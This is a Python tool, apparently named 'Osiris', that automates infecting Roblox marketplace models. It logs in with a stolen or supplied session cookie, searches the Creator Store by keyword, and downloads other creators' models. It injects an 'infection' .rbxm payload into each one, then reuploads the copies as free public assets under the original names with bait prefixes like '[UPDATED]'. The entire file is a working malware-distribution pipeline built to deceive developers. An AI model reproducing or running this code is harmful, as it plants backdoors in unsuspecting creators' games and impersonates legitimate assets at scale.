import asyncio
import aiohttp
import aiofiles
import json
import os
import sys
import time
import subprocess
import concurrent.futures
from typing import Optional, Dict
from dataclasses import dataclass, field
from pathlib import Path
import gc
import logging
import random
import tempfile
from colorama import init, Fore, Back, Style

init(autoreset=True)

class ColoredFormatter(logging.Formatter):
    def format(self, record):
        original_levelname = record.levelname
        original_msg = record.msg
        
        if record.levelno == logging.INFO:
            record.levelname = f"{Fore.CYAN}{record.levelname}{Style.RESET_ALL}"
            record.msg = f"{Fore.CYAN}{record.msg}{Style.RESET_ALL}"
        elif record.levelno == logging.WARNING:
            record.levelname = f"{Fore.YELLOW}{record.levelname}{Style.RESET_ALL}"
            record.msg = f"{Fore.YELLOW}{record.msg}{Style.RESET_ALL}"
        elif record.levelno == logging.ERROR:
            record.levelname = f"{Fore.RED}{record.levelname}{Style.RESET_ALL}"
            record.msg = f"{Fore.RED}{record.msg}{Style.RESET_ALL}"
        elif record.levelno == logging.DEBUG:
            record.levelname = f"{Fore.MAGENTA}{record.levelname}{Style.RESET_ALL}"
            record.msg = f"{Fore.MAGENTA}{record.msg}{Style.RESET_ALL}"
        
        result = super().format(record)
        
        record.levelname = original_levelname
        record.msg = original_msg
        
        return result

logger = logging.getLogger(__name__)
logger.setLevel(logging.INFO)
handler = logging.StreamHandler(sys.stdout)
handler.setFormatter(ColoredFormatter('[%(levelname)s] %(message)s'))
logger.addHandler(handler)

def print_banner():
    banner = f"""
{Style.BRIGHT}
________         .__       .__        
\_____  \   _____|__|______|__| ______
 /   |   \ /  ___/  \_  __ \  |/  ___/
/    |    \\___ \|  ||  | \/  |\___ \ 
\_______  /____  >__||__|  |__/____  >
        \/     \/                  \/ 

{Style.RESET_ALL}{Fore.CYAN}Officially by fedeloz13 (@.fedeloz13){Style.RESET_ALL}
"""
    print(banner)
    print()

@dataclass
class Config:
    REQUEST_DELAY_MS: int = 1000
    COOKIE_FILE: str = "cookies.txt"
    INFECTION_DIR: str = "infection"
    MAX_RETRIES: int = 4
    RETRY_DELAY_MS: int = 50000
    PARALLEL_UPLOADS: int = 10
    SHOW_TIMING: bool = True
    DEBUG_MODE: bool = True
    MAX_MODEL_SIZE_MB: int = 10
    RBXM_PARSER_SCRIPT: str = "./dist/bridge.js"

@dataclass
class Stats:
    scanned: int = 0
    uploaded: int = 0
    skipped: int = 0
    errors: int = 0
    serialization_errors: int = 0
    last_successful_model: Optional[str] = None
    start_time: float = field(default_factory=time.time)
    cache_hits: int = 0
    cache_misses: int = 0

class RbxmBridge:
    def __init__(self, script_path: str):
        self.script_path = script_path
        self._temp_dir = tempfile.mkdtemp()

    async def process_model(self, model_buffer: bytes, infection_buffer: bytes) -> Optional[bytes]:
        try:
            model_path = os.path.join(self._temp_dir, f"model_{int(time.time() * 1000)}.rbxm")
            infection_path = os.path.join(self._temp_dir, f"infection_{int(time.time() * 1000)}.rbxm")
            output_path = os.path.join(self._temp_dir, f"output_{int(time.time() * 1000)}.rbxm")
            
            with open(model_path, 'wb') as f:
                f.write(model_buffer)
            with open(infection_path, 'wb') as f:
                f.write(infection_buffer)
                
            cmd = ['node', self.script_path, 'process', model_path, infection_path, output_path]
            process = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            stdout, stderr = await process.communicate()
            
            if process.returncode != 0:
                logger.error(f"Bridge process error: {stderr.decode('utf-8', errors='replace')}")
                return None
                
            if os.path.exists(output_path):
                with open(output_path, 'rb') as f:
                    result = f.read()
                for path in [model_path, infection_path, output_path]:
                    if os.path.exists(path):
                        os.unlink(path)
                return result
            return None
        except Exception as e:
            logger.error(f"Process model error: {str(e)}")
            return None

    async def load_infection(self, infection_path: str) -> Optional[Dict]:
        try:
            cmd = ['node', self.script_path, 'load', infection_path]
            process = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            stdout, stderr = await process.communicate()
            
            if process.returncode != 0:
                logger.error(f"Load infection error: {stderr.decode('utf-8', errors='replace')}")
                return None
                
            return json.loads(stdout.decode('utf-8', errors='replace'))
        except Exception as e:
            logger.error(f"Load infection error: {str(e)}")
            return None

class UploadQueue:
    def __init__(self, max_concurrent: int = 1):
        self.max_concurrent = max_concurrent
        self.semaphore = asyncio.Semaphore(max_concurrent)
        self.active_tasks = set()

    async def add(self, coro):
        async with self.semaphore:
            task = asyncio.create_task(coro)
            self.active_tasks.add(task)
            try:
                result = await task
                return result
            finally:
                self.active_tasks.discard(task)

    async def drain(self):
        while self.active_tasks:
            await asyncio.sleep(0.1)

class RobloxAPI:
    def __init__(self, cookie: str):
        self.cookie = cookie
        self.session: Optional[aiohttp.ClientSession] = None
        self.csrf_token = ""

    async def __aenter__(self):
        timeout = aiohttp.ClientTimeout(total=180)
        connector = aiohttp.TCPConnector(keepalive_timeout=60, limit=50, limit_per_host=25)
        self.session = aiohttp.ClientSession(
            timeout=timeout,
            connector=connector,
            headers={'Cookie': f'.ROBLOSECURITY={self.cookie}'}
        )
        await self._get_csrf_token()
        return self

    async def __aexit__(self, exc_type, exc_val, exc_tb):
        if self.session:
            await self.session.close()

    async def _get_csrf_token(self):
        try:
            async with self.session.post('https://auth.roblox.com/v2/logout') as response:
                self.csrf_token = response.headers.get('X-CSRF-TOKEN', '')
        except Exception as e:
            logger.warning(f"CSRF token fetch warning: {str(e)}")

    async def api_request(self, request_func, function_name: str, max_retries: int = 4):
        for attempt in range(1, max_retries + 1):
            try:
                result = await request_func()
                if attempt > 1:
                    logger.info(f"{Fore.GREEN}[RETRY SUCCESS]{Style.RESET_ALL} {function_name} succeeded after {attempt} attempts")
                return result
            except Exception as error:
                is_timeout = isinstance(error, (asyncio.TimeoutError, aiohttp.ServerTimeoutError))
                status = getattr(error, 'status', None) if hasattr(error, 'status') else None
                
                if (status in [429] or status >= 500 or is_timeout) and attempt < max_retries:
                    delay = (10000 * (1.5 ** (attempt - 1))) / 1000
                    logger.warning(f"{Fore.YELLOW}[WARNING]{Style.RESET_ALL} {function_name} failed ({'timeout' if is_timeout else f'HTTP {status}'}), attempt {attempt}. Retrying in {delay}s...")
                    await asyncio.sleep(delay)
                else:
                    logger.error(f"{Fore.RED}[ERROR]{Style.RESET_ALL} {function_name} failed after {attempt} attempts: {str(error)}")
                    if status == 403:
                        logger.warning(f"{Fore.YELLOW}[WARNING]{Style.RESET_ALL} Possible CSRF token issue")
                    return None
        return None

    async def search_models(self, keyword: str, cursor: Optional[str] = None) -> Optional[Dict]:
        async def request():
            url = f"https://apis.roblox.com/toolbox-service/v1/marketplace/10?keyword={keyword}"
            if cursor:
                url += f"&cursor={cursor}"
            async with self.session.get(url) as response:
                response.raise_for_status()
                return await response.json()
        return await self.api_request(request, "searchModels")

    async def download_model(self, model_id: int) -> Optional[bytes]:
        async def request():
            url = f"https://assetdelivery.roblox.com/v1/asset/?id={model_id}"
            async with self.session.get(url) as response:
                response.raise_for_status()
                data = await response.read()
                if len(data) == 0:
                    raise ValueError("Downloaded empty model")
                size_mb = len(data) / (1024 * 1024)
                if size_mb > 10:
                    raise ValueError(f"Model too large ({size_mb:.1f}MB > 10MB limit)")
                return data
        return await self.api_request(request, "downloadModel")

    async def get_model_details(self, asset_id: int) -> Optional[Dict]:
        async def request():
            url = f"https://apis.roblox.com/toolbox-service/v1/items/details?assetIds={asset_id}"
            async with self.session.get(url) as response:
                response.raise_for_status()
                data = await response.json()
                return data.get('data', [{}])[0].get('asset')
        return await self.api_request(request, "getModelDetails")

    async def upload_model(self, model_buffer: bytes, name: str, description: str) -> Optional[int]:
        try:
            os.makedirs('./tmp', exist_ok=True)
            temp_model_path = os.path.join('./tmp', f"{int(time.time() * 1000)}.rbxm")
            temp_script_path = os.path.join('./tmp', f"upload_{int(time.time() * 1000)}.js")

            with open(temp_model_path, 'wb') as f:
                f.write(model_buffer)

            escaped_path = temp_model_path.replace('\\', '\\\\')
            escaped_name = name.replace('`', '\\`').replace('$', '\\$')
            escaped_description = description.replace('`', '\\`').replace('$', '\\$')
            
            script_lines = [
                "const noblox = require('noblox.js');",
                "const fs = require('fs');",
                "",
                "async function upload() {",
                "    try {",
                f"        await noblox.setCookie('{self.cookie}');",
                f"        const stream = fs.createReadStream('{escaped_path}');",
                f"        const assetId = await noblox.uploadModel(stream, {{",
                f"            name: `{escaped_name}`,",
                f"            description: `{escaped_description}`,",
                f"            allowDuplicates: false",
                f"        }});",
                f"        console.log(JSON.stringify({{success: true, assetId}}));",
                "    } catch (error) {",
                f"        console.log(JSON.stringify({{success: false, error: error.message}}));",
                "    }",
                "}",
                "",
                "upload();"
            ]
            
            upload_script = '\n'.join(script_lines)
            
            with open(temp_script_path, 'w', encoding='utf-8') as f:
                f.write(upload_script)

            process = await asyncio.create_subprocess_exec(
                'node', temp_script_path,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            stdout, stderr = await process.communicate()

            try:
                os.unlink(temp_model_path)
                os.unlink(temp_script_path)
            except:
                pass

            if process.returncode == 0:
                try:
                    result = json.loads(stdout.decode('utf-8', errors='replace'))
                    if result.get('success'):
                        asset_id = result.get('assetId')
                        logger.info(f"{Fore.GREEN}[SUCCESS]{Style.RESET_ALL} Uploaded: {name} (ID: {asset_id})")
                        await self.make_model_public(asset_id)
                        return asset_id
                except json.JSONDecodeError:
                    logger.error(f"{Fore.RED}[UPLOAD ERROR]{Style.RESET_ALL} Failed to parse response")

            if stderr:
                logger.error(f"{Fore.RED}[UPLOAD ERROR]{Style.RESET_ALL} {stderr.decode('utf-8', errors='replace')}")
            return None
        except Exception as e:
            logger.error(f"{Fore.RED}[UPLOAD ERROR]{Style.RESET_ALL} {str(e)}")
            return None

    async def make_model_public(self, asset_id: int) -> bool:
        async def request():
            url = f"https://apis.roblox.com/user/cloud/v2/creator-store-products/PRODUCT_NAMESPACE_CREATOR_MARKETPLACE_ASSET-PRODUCT_TYPE_MODEL-{asset_id}?allowMissing=true"
            data = {
                "basePrice": {"currencyCode": "USD", "quantity": {"significand": 0, "exponent": 0}},
                "published": True,
                "modelAssetId": str(asset_id)
            }
            headers = {"Content-Type": "application/json", "X-CSRF-TOKEN": self.csrf_token}
            async with self.session.patch(url, json=data, headers=headers) as response:
                response.raise_for_status()
                return True
        return await self.api_request(request, "makeModelPublic") or False

class ModelProcessor:
    def __init__(self, config: Config):
        self.config = config
        self.stats = Stats()
        self.upload_queue = UploadQueue(config.PARALLEL_UPLOADS)
        self.rbxm_bridge = RbxmBridge(config.RBXM_PARSER_SCRIPT)
        self.infection_buffer: Optional[bytes] = None

    async def load_infection(self) -> bool:
        infection_dir = Path(self.config.INFECTION_DIR)
        if not infection_dir.exists():
            logger.error(f"{Fore.RED}[ERROR]{Style.RESET_ALL} Infection directory not found: {self.config.INFECTION_DIR}")
            return False
            
        infection_files = list(infection_dir.glob("*.rbxm"))
        if not infection_files:
            logger.error(f"{Fore.RED}[ERROR]{Style.RESET_ALL} No .rbxm files found in infection directory")
            return False
            
        infection_files.sort(key=lambda f: f.stat().st_size)
        infection_path = infection_files[0]
        
        async with aiofiles.open(infection_path, 'rb') as f:
            self.infection_buffer = await f.read()
        
        logger.info(f"{Fore.CYAN}[INFO]{Style.RESET_ALL} Loading infection file: {infection_path.name}")
        metadata = await self.rbxm_bridge.load_infection(str(infection_path))
        
        if metadata:
            logger.info(f"{Fore.GREEN}[SUCCESS]{Style.RESET_ALL} Infection file loaded successfully")
            for i, root in enumerate(metadata.get('roots', []), 1):
                name = root.get('name', 'Unknown')
                class_name = root.get('className', 'Unknown')
                children_count = root.get('childrenCount', 0)
                logger.info(
                    f"  {i}. {Fore.CYAN}{name}{Style.RESET_ALL} ({Fore.YELLOW}{class_name}{Style.RESET_ALL}) with {Fore.MAGENTA}{children_count}{Style.RESET_ALL} children"
                )
        else:
            logger.error(f"{Fore.RED}[ERROR]{Style.RESET_ALL} Failed to load infection metadata")
            return False
        return True

    async def process_model(self, model: Dict, api: RobloxAPI) -> None:
        model_id = model['id']
        start_time = time.time()
        try:
            original_info = await api.get_model_details(model_id)
            if not original_info:
                self.stats.skipped += 1
                return
                
            model_data = await api.download_model(model_id)
            if not model_data:
                self.stats.skipped += 1
                return
                
            modified_data = await self.rbxm_bridge.process_model(model_data, self.infection_buffer)
            if not modified_data:
                self.stats.errors += 1
                return

            # No emojis — only clean prefix
            prefixes = ['[UPDATED]', '[New]', '[Revamped]', '[Improved]', '[Fresh]']
            prefix = random.choice(prefixes)
            original_name = f"{prefix} {original_info.get('name', 'Model')}".strip()

            asset_id = await self.upload_queue.add(
                api.upload_model(
                    modified_data,
                    original_name,
                    original_info.get('description', '')
                )
            )
            
            if asset_id:
                self.stats.uploaded += 1
                self.stats.scanned += 1
                self.stats.last_successful_model = f"{original_name} ({asset_id})"
                duration = time.time() - start_time
                logger.info(
                    f"{Fore.GREEN}[SUCCESS]{Style.RESET_ALL} Completed processing model {model_id} in {duration:.1f}s"
                )
            else:
                self.stats.errors += 1
                
        except Exception as e:
            self.stats.errors += 1
            logger.error(f"{Fore.RED}[ERROR]{Style.RESET_ALL} Error processing model {model_id}: {str(e)}")
            
        if self.stats.scanned % 10 == 0:
            gc.collect()

    async def process_all_pages(self, query: str, api: RobloxAPI, upload_limit: int) -> None:
        cursor = None
        page = 1
        while self.stats.uploaded < upload_limit:
            logger.info(f"{Fore.CYAN}[INFO]{Style.RESET_ALL} Processing page {page}...")
            search_results = await api.search_models(query, cursor)
            
            if not search_results or not search_results.get('data'):
                logger.warning(f"{Fore.YELLOW}[WARNING]{Style.RESET_ALL} No more results found")
                break
                
            models = search_results['data']
            logger.info(f"{Fore.GREEN}[FOUND]{Style.RESET_ALL} {len(models)} models on this page")
            
            for i in range(0, len(models), self.config.PARALLEL_UPLOADS):
                batch = models[i:i + self.config.PARALLEL_UPLOADS]
                if self.stats.uploaded >= upload_limit:
                    return
                tasks = [self.process_model(model, api) for model in batch]
                await asyncio.gather(*tasks, return_exceptions=True)
                await asyncio.sleep(self.config.REQUEST_DELAY_MS / 1000)
                
            cursor = search_results.get('nextPageCursor')
            if not cursor:
                logger.info(f"{Fore.CYAN}[INFO]{Style.RESET_ALL} Reached end of results")
                break
            page += 1
            
        await self.upload_queue.drain()

    async def run(self) -> None:
        print_banner()   
        cookie_path = Path(self.config.COOKIE_FILE)
        if not cookie_path.exists():
            logger.error(f"{Fore.RED}[ERROR]{Style.RESET_ALL} Cookie file not found: {self.config.COOKIE_FILE}")
            return
            
        async with aiofiles.open(cookie_path, 'r', encoding='utf-8') as f:
            cookie = (await f.read()).strip()
            
        if not cookie:
            logger.error(f"{Fore.RED}[ERROR]{Style.RESET_ALL} Cookie file is empty")
            return
        
        logger.info(f"{Fore.GREEN}[SUCCESS]{Style.RESET_ALL} Cookie loaded successfully")
        
        if not await self.load_infection():
            return
        
        try:
            upload_limit_input = input(f"{Fore.CYAN}How many models to upload? (max 200): {Style.RESET_ALL}").strip()
            upload_limit = int(upload_limit_input) if upload_limit_input else 50
            
            query = input(f"{Fore.CYAN}Search query (e.g., car, house, furniture): {Style.RESET_ALL}").strip()
        except KeyboardInterrupt:
            logger.warning(f"{Fore.YELLOW}[WARNING]{Style.RESET_ALL} Input cancelled by user")
            return
        except ValueError:
            logger.error(f"{Fore.RED}[ERROR]{Style.RESET_ALL} Invalid number entered")
            return
            
        if not query:
            logger.error(f"{Fore.RED}[ERROR]{Style.RESET_ALL} No search query provided")
            return
        
        logger.info(f"{Fore.CYAN}[INFO]{Style.RESET_ALL} Searching for: {Fore.GREEN}{query}{Style.RESET_ALL}")
        logger.info(f"{Fore.CYAN}[INFO]{Style.RESET_ALL} Upload limit: {Fore.YELLOW}{upload_limit}{Style.RESET_ALL} models")
        logger.info(f"{Fore.CYAN}[INFO]{Style.RESET_ALL} Parallel uploads: {Fore.MAGENTA}{self.config.PARALLEL_UPLOADS}{Style.RESET_ALL}")
        
        async with RobloxAPI(cookie) as api:
            await self.process_all_pages(query, api, upload_limit)
        
        duration = time.time() - self.stats.start_time
        logger.info(f"\n{Fore.MAGENTA}{Style.BRIGHT}=== Process completed ==={Style.RESET_ALL}")
        logger.info(f"{Fore.CYAN}Duration:{Style.RESET_ALL}      {Fore.YELLOW}{duration:.1f}{Style.RESET_ALL} seconds")
        logger.info(f"{Fore.CYAN}Models found:{Style.RESET_ALL}  {Fore.GREEN}{self.stats.scanned + self.stats.skipped}{Style.RESET_ALL}")
        logger.info(f"{Fore.CYAN}Uploaded:{Style.RESET_ALL}      {Fore.GREEN}{self.stats.uploaded}{Style.RESET_ALL}")
        logger.info(f"{Fore.CYAN}Skipped:{Style.RESET_ALL}       {Fore.YELLOW}{self.stats.skipped}{Style.RESET_ALL}")
        logger.info(f"{Fore.CYAN}Errors:{Style.RESET_ALL}        {Fore.RED}{self.stats.errors}{Style.RESET_ALL}")
        if self.stats.last_successful_model:
            logger.info(f"{Fore.CYAN}Last success:{Style.RESET_ALL}  {Fore.GREEN}{self.stats.last_successful_model}{Style.RESET_ALL}")

async def main():
    try:
        config = Config()
        processor = ModelProcessor(config)
        await processor.run()
    except KeyboardInterrupt:
        logger.warning(f"{Fore.YELLOW}[WARNING]{Style.RESET_ALL} Interrupted by user")
    except Exception as e:
        logger.error(f"{Fore.RED}[FATAL ERROR]{Style.RESET_ALL} {str(e)}")
        sys.exit(1)

if __name__ == "__main__":
    asyncio.run(main())